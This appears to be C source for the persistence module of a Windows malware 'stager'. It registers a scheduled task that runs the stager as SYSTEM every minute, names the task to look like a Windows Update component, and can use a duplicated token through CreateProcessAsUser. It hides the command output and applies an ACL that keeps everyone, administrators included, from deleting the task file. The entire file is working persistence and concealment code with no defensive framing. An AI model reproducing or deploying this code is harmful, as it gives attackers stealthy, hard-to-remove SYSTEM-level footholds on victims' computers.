#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <sddl.h>

#ifndef LOGV
static void LogWatchdogPrintf(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vfprintf(stdout, fmt, args);
    va_end(args);
}
#define LOGV(...) LogWatchdogPrintf(__VA_ARGS__)
#define LOGE(...) LogWatchdogPrintf(__VA_ARGS__)
#endif

#define STAGERV3_WATCHDOG_TASK_NAME "\\Microsoft\\Windows\\WindowsUpdate\\Watchdog"
#define STAGERV3_WATCHDOG_TASK_NAME_LEGACY "WaaSWatchdog"
#define STAGERV3_WATCHDOG_TASK_NAME_LEGACY2 "\\Microsoft\\Windows\\UpdateOrchestrator\\Watchdog"
#define STAGE_PERSISTENCE_LAUNCH_ARG "--persistent"
#define STAGE_WATCHDOG_SDDL_PROTECT "O:SYD:PAI(A;;FA;;;SY)(D;;DE;;;WD)"
#define STAGE_WATCHDOG_SDDL_PROTECT_ALT "O:SYD:PAI(A;;FA;;;SY)(D;;DE;;;S-1-5-11)(D;;DE;;;S-1-5-32-544)"

static BOOL BuildWatchdogMonitorCommand(LPCSTR lpStagerPath, LPSTR lpCommand, size_t cchCommand);
static BOOL RunSchtasksCommand(BOOL bSuppressOutput, int* pExitCode, const char* lpFormat, ...);
static BOOL RunSchtasksCommandWithToken(HANDLE hToken, BOOL bSuppressOutput, int* pExitCode, const char* lpFormat, ...);
static BOOL TaskLikelyExists(LPCSTR lpTaskName);
static BOOL TaskLikelyExistsWithToken(HANDLE hToken, LPCSTR lpTaskName);
static BOOL DeleteWatchdogTaskWithToken(HANDLE hToken, LPCSTR lpTaskName);
static BOOL ApplyProtectedFilesystemAcl(LPCSTR lpPath, LPCSTR lpSddl);
static BOOL ApplyProtectedFilesystemAclWithFallback(LPCSTR lpPath, LPCSTR lpPrimarySddl, LPCSTR lpFallbackSddl);
static BOOL BuildTaskFilesystemPath(LPCSTR lpTaskName, LPSTR lpTaskPath, size_t cchTaskPath);
static BOOL HardenWatchdogFilesystemObject(LPCSTR lpTaskName);
static BOOL ExecuteSchtasksCommandWithToken(HANDLE hToken, BOOL bSuppressOutput, const char* lpCommand, int* pExitCode);
static BOOL DuplicateTokenForSchtaskExecution(HANDLE hToken, HANDLE* phPrimaryToken);

BOOL InstallWatchdogWithToken(HANDLE hToken, LPCSTR lpStagerPath);

static BOOL BuildWatchdogMonitorCommand(LPCSTR lpStagerPath, LPSTR lpCommand, size_t cchCommand) {
    if (!lpStagerPath || !*lpStagerPath || !lpCommand || cchCommand == 0) {
        return FALSE;
    }

    return _snprintf(lpCommand, cchCommand, "\"%s\" %s", lpStagerPath, STAGE_PERSISTENCE_LAUNCH_ARG) >= 0;
}

static BOOL ExecuteSchtasksCommandWithToken(HANDLE hToken, BOOL bSuppressOutput, const char* lpCommand, int* pExitCode) {
    if (!lpCommand || !*lpCommand) {
        return FALSE;
    }

    char systemDir[MAX_PATH] = { 0 };
    char commandLine[2300] = { 0 };
    HANDLE hExecutionToken = NULL;
    HANDLE hNullHandle = NULL;
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.lpDesktop = "winsta0\\default";
    BOOL bInheritHandles = bSuppressOutput;

    if (!GetSystemDirectoryA(systemDir, MAX_PATH)) {
        _snprintf(systemDir, MAX_PATH, "C:\\Windows\\System32");
    }

    if (_snprintf(commandLine, sizeof(commandLine), "\"%s\\schtasks.exe\" %s", systemDir, lpCommand) < 0) {
        return FALSE;
    }

    if (bSuppressOutput) {
        SECURITY_ATTRIBUTES sa = { 0 };
        sa.nLength = sizeof(sa);
        sa.bInheritHandle = TRUE;
        hNullHandle = CreateFileA(
            "NUL",
            GENERIC_WRITE | GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            &sa,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hNullHandle == INVALID_HANDLE_VALUE) {
            return FALSE;
        }

        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = hNullHandle;
        si.hStdOutput = hNullHandle;
        si.hStdError = hNullHandle;
    }

    if (hToken) {
        if (!DuplicateTokenForSchtaskExecution(hToken, &hExecutionToken)) {
            LOGV("[-] DuplicateTokenForSchtaskExecution failed (%lu)\n", GetLastError());
            hExecutionToken = NULL;
        }
    }

    BOOL bCreated = CreateProcessA(
        NULL,
        commandLine,
        NULL,
        NULL,
        bInheritHandles,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
    if (!bCreated) {
        DWORD runErr = GetLastError();
        LOGV("[-] CreateProcessA failed for schtasks command (%lu)\n", runErr);

        if (!bCreated && hExecutionToken) {
            bCreated = CreateProcessAsUserA(
                hExecutionToken,
                NULL,
                commandLine,
                NULL,
                NULL,
                bInheritHandles,
                CREATE_NO_WINDOW,
                NULL,
                NULL,
                &si,
                &pi
            );
            if (!bCreated) {
                LOGV("[-] CreateProcessAsUserA failed for schtasks command (%lu)\n", GetLastError());
            }
        }
    }

    if (!bCreated) {
        if (pExitCode) {
            *pExitCode = (int)GetLastError();
        }
        if (hExecutionToken) {
            CloseHandle(hExecutionToken);
        }
        if (hNullHandle) {
            CloseHandle(hNullHandle);
        }
        return FALSE;
    }

    if (hExecutionToken) {
        CloseHandle(hExecutionToken);
    }

    DWORD exitCode = 0xFFFFFFFF;
    if (WaitForSingleObject(pi.hProcess, 15000) != WAIT_TIMEOUT) {
        GetExitCodeProcess(pi.hProcess, &exitCode);
    }

    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) {
        CloseHandle(pi.hThread);
    }
    if (hNullHandle) {
        CloseHandle(hNullHandle);
    }

    if (pExitCode) {
        *pExitCode = (int)exitCode;
    }

    if (exitCode == 259) {
        return TRUE;
    }
    return exitCode == 0;
}

static BOOL DuplicateTokenForSchtaskExecution(HANDLE hToken, HANDLE* phPrimaryToken) {
    if (!hToken || !phPrimaryToken) {
        return FALSE;
    }

    *phPrimaryToken = NULL;
    if (DuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            phPrimaryToken
        )) {
        return TRUE;
    }

    LOGV(
        "[-] DuplicateTokenEx(SecurityImpersonation, TokenPrimary) failed for schtasks (%lu), retrying SecurityDelegation\n",
        GetLastError()
    );
    return DuplicateTokenEx(
        hToken,
        MAXIMUM_ALLOWED,
        NULL,
        SecurityDelegation,
        TokenPrimary,
        phPrimaryToken
    );
}

static BOOL RunSchtasksCommandWithToken(HANDLE hToken, BOOL bSuppressOutput, int* pExitCode, const char* lpFormat, ...) {
    if (!lpFormat || !*lpFormat) {
        return FALSE;
    }

    char command[2048] = { 0 };
    va_list args;
    va_start(args, lpFormat);
    int commandLen = _vsnprintf(command, sizeof(command), lpFormat, args);
    va_end(args);
    if (commandLen < 0 || commandLen >= (int)sizeof(command)) {
        return FALSE;
    }

    return ExecuteSchtasksCommandWithToken(hToken, bSuppressOutput, command, pExitCode);
}

static BOOL RunSchtasksCommand(BOOL bSuppressOutput, int* pExitCode, const char* lpFormat, ...) {
    if (!lpFormat || !*lpFormat) {
        return FALSE;
    }

    char command[2048] = { 0 };
    va_list args;
    va_start(args, lpFormat);
    int commandLen = _vsnprintf(command, sizeof(command), lpFormat, args);
    va_end(args);
    if (commandLen < 0 || commandLen >= (int)sizeof(command)) {
        return FALSE;
    }

    return ExecuteSchtasksCommandWithToken(NULL, bSuppressOutput, command, pExitCode);
}

static BOOL TaskLikelyExistsWithToken(HANDLE hToken, LPCSTR lpTaskName) {
    if (!lpTaskName || !*lpTaskName) {
        return FALSE;
    }

    int queryStatus = 0;
    if (!RunSchtasksCommandWithToken(hToken, TRUE, &queryStatus, "/query /tn \"%s\"", lpTaskName)) {
        return FALSE;
    }
    return queryStatus == 0;
}

static BOOL TaskLikelyExists(LPCSTR lpTaskName) {
    return TaskLikelyExistsWithToken(NULL, lpTaskName);
}

static BOOL BuildTaskFilesystemPath(LPCSTR lpTaskName, LPSTR lpTaskPath, size_t cchTaskPath) {
    if (!lpTaskName || !*lpTaskName || !lpTaskPath || cchTaskPath == 0) {
        return FALSE;
    }

    char windowsRoot[MAX_PATH] = { 0 };
    if (!GetWindowsDirectoryA(windowsRoot, MAX_PATH)) {
        _snprintf(windowsRoot, MAX_PATH, "C:\\Windows");
    }

    if (lpTaskName[0] == '\\' || lpTaskName[0] == '/') {
        lpTaskName += 1;
    }

    if (_snprintf(lpTaskPath, cchTaskPath, "%s\\System32\\Tasks\\%s", windowsRoot, lpTaskName) < 0) {
        return FALSE;
    }
    for (size_t i = 0; lpTaskPath[i] != '\\0'; ++i) {
        if (lpTaskPath[i] == '/') {
            lpTaskPath[i] = '\\';
        }
    }

    return TRUE;
}

static BOOL ApplyProtectedFilesystemAcl(LPCSTR lpPath, LPCSTR lpSddl) {
    if (!lpPath || !*lpPath || !lpSddl || !*lpSddl) {
        return FALSE;
    }

    return ApplyProtectedFilesystemAclWithFallback(lpPath, lpSddl, STAGE_WATCHDOG_SDDL_PROTECT_ALT);
}

static BOOL ApplyProtectedFilesystemAclWithFallback(LPCSTR lpPath, LPCSTR lpPrimarySddl, LPCSTR lpFallbackSddl) {
    if (!lpPath || !*lpPath || !lpPrimarySddl || !*lpPrimarySddl) {
        return FALSE;
    }

    PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
    const char* lpCandidates[3] = { lpPrimarySddl, lpFallbackSddl, NULL };

    for (int i = 0; i < 3; ++i) {
        if (!lpCandidates[i]) {
            return FALSE;
        }

        if (!ConvertStringSecurityDescriptorToSecurityDescriptorA(
                lpCandidates[i],
                SDDL_REVISION_1,
                &pSecurityDescriptor,
                NULL
            )) {
            LOGV(
                "[-] ConvertStringSecurityDescriptorToSecurityDescriptorA failed for filesystem candidate %d (%lu)\n",
                i,
                GetLastError()
            );
            continue;
        }

        BOOL bApplied = SetFileSecurityA(lpPath, DACL_SECURITY_INFORMATION, pSecurityDescriptor);
        DWORD dwErr = GetLastError();
        LocalFree(pSecurityDescriptor);
        pSecurityDescriptor = NULL;
        if (bApplied) {
            return TRUE;
        }

        SetLastError(dwErr);
        LOGV("[-] SetFileSecurityA failed for filesystem candidate %d (%lu)\n", i, dwErr);
    }

    return FALSE;
}

static BOOL HardenWatchdogFilesystemObject(LPCSTR lpTaskName) {
    if (!lpTaskName || !*lpTaskName) {
        return FALSE;
    }

    char lpTaskPath[MAX_PATH * 2] = { 0 };
    if (!BuildTaskFilesystemPath(lpTaskName, lpTaskPath, sizeof(lpTaskPath))) {
        return FALSE;
    }

    if (!ApplyProtectedFilesystemAcl(lpTaskPath, STAGE_WATCHDOG_SDDL_PROTECT)) {
        LOGV("[-] Failed to harden watchdog task file ACL %s (%lu)\n", lpTaskPath, GetLastError());
        return FALSE;
    }

    return TRUE;
}

static BOOL DeleteWatchdogTaskWithToken(HANDLE hToken, LPCSTR lpTaskName) {
    if (!lpTaskName || !*lpTaskName) {
        return FALSE;
    }

    if (!TaskLikelyExistsWithToken(hToken, lpTaskName)) {
        return TRUE;
    }

    int status = 0;
    if (!RunSchtasksCommandWithToken(hToken, TRUE, &status, "/delete /tn \"%s\" /f", lpTaskName)) {
        LOGV("[-] schtasks delete failed for %s (code=%d)\n", lpTaskName, status);
        return FALSE;
    }
    return status == 0;
}

static BOOL CreateWatchdogTaskWithToken(HANDLE hToken, LPCSTR lpTaskName, LPCSTR lpMonitorCommand, BOOL bStartImmediately) {
    if (!lpTaskName || !*lpTaskName || !lpMonitorCommand || !*lpMonitorCommand) {
        return FALSE;
    }

    if (TaskLikelyExistsWithToken(hToken, lpTaskName)) {
        LOGV("[*] Existing watchdog task %s detected; skipping recreation/update path.\n", lpTaskName);
        if (bStartImmediately) {
            int runStatus = 0;
            if (!RunSchtasksCommandWithToken(
                    hToken,
                    TRUE,
                    &runStatus,
                    "/run /tn \"%s\"",
                    lpTaskName
                )) {
                LOGV(
                    "[-] schtasks run failed for existing watchdog %s (code=%d). Continuing; scheduled launch remains configured.\n",
                    lpTaskName,
                    runStatus
                );
            }
        }
        return TRUE;
    }

    DeleteWatchdogTaskWithToken(hToken, STAGERV3_WATCHDOG_TASK_NAME_LEGACY);
    DeleteWatchdogTaskWithToken(hToken, STAGERV3_WATCHDOG_TASK_NAME_LEGACY2);

    int status = 0;
    BOOL bCreated = FALSE;

    if (RunSchtasksCommandWithToken(
            hToken,
            TRUE,
            &status,
            "/create /tn \"%s\" /sc MINUTE /mo 1 /ru SYSTEM /np /f /tr \"%s\"",
            lpTaskName,
            lpMonitorCommand
        )) {
        bCreated = status == 0;
    } else {
        LOGV(
            "[-] schtasks create failed for watchdog %s using SYSTEM account (code=%d), retrying NT AUTHORITY\\\\SYSTEM\n",
            lpTaskName,
            status
        );
    }

    if (!bCreated) {
        if (RunSchtasksCommandWithToken(
                hToken,
                TRUE,
                &status,
                "/create /tn \"%s\" /sc MINUTE /mo 1 /ru \"NT AUTHORITY\\\\SYSTEM\" /np /f /tr \"%s\"",
                lpTaskName,
                lpMonitorCommand
            )) {
            bCreated = status == 0;
        } else {
            LOGV(
                "[-] schtasks create with NT AUTHORITY\\\\SYSTEM account failed for watchdog %s (code=%d), retrying without /np\n",
                lpTaskName,
                status
            );
        }
    }

    if (!bCreated) {
        if (RunSchtasksCommandWithToken(
                hToken,
                TRUE,
                &status,
                "/create /tn \"%s\" /sc MINUTE /mo 1 /ru SYSTEM /f /tr \"%s\"",
                lpTaskName,
                lpMonitorCommand
            )) {
            bCreated = status == 0;
        } else {
            LOGV("[-] schtasks create failed for watchdog %s (code=%d)\n", lpTaskName, status);
        }
    }

    if (!bCreated) {
        return FALSE;
    }

    if (bStartImmediately) {
        int runStatus = 0;
        if (!RunSchtasksCommandWithToken(hToken, TRUE, &runStatus, "/run /tn \"%s\"", lpTaskName)) {
            LOGV(
                "[-] schtasks run failed for watchdog %s (code=%d). Continuing; scheduled launch remains configured.\n",
                lpTaskName,
                runStatus
            );
        }
    }

    if (!HardenWatchdogFilesystemObject(lpTaskName)) {
        LOGV("[-] Failed to harden watchdog task filesystem object for %s (%lu)\n", lpTaskName, GetLastError());
    } else {
        LOGV("[+] Applied protected ACL to watchdog task filesystem object %s\n", lpTaskName);
    }

    return TRUE;
}

BOOL InstallWatchdog(LPCSTR lpStagerPath) {
    return InstallWatchdogWithToken(NULL, lpStagerPath);
}

BOOL InstallWatchdogWithToken(HANDLE hToken, LPCSTR lpStagerPath) {
    if (!lpStagerPath || !*lpStagerPath) {
        return FALSE;
    }

    char monitorCommand[MAX_PATH * 2] = { 0 };
    if (!BuildWatchdogMonitorCommand(lpStagerPath, monitorCommand, sizeof(monitorCommand))) {
        return FALSE;
    }

    if (!CreateWatchdogTaskWithToken(hToken, STAGERV3_WATCHDOG_TASK_NAME, monitorCommand, TRUE)) {
        return FALSE;
    }
    return TRUE;
}

BOOL LaunchWatchdogNow(LPCSTR lpStagerPath) {
    (void)lpStagerPath;
    int runStatus = 0;
    if (!RunSchtasksCommand(TRUE, &runStatus, "/run /tn \"%s\"", STAGERV3_WATCHDOG_TASK_NAME)) {
        LOGV("[-] schtasks run failed for watchdog %s (code=%d)\n", STAGERV3_WATCHDOG_TASK_NAME, runStatus);
        return FALSE;
    }
    return TRUE;
}

BOOL LaunchWatchdogNowWithToken(HANDLE hToken) {
    int runStatus = 0;
    if (!RunSchtasksCommandWithToken(hToken, TRUE, &runStatus, "/run /tn \"%s\"", STAGERV3_WATCHDOG_TASK_NAME)) {
        LOGV("[-] schtasks run failed for watchdog %s (code=%d)\n", STAGERV3_WATCHDOG_TASK_NAME, runStatus);
        return FALSE;
    }
    return TRUE;
}
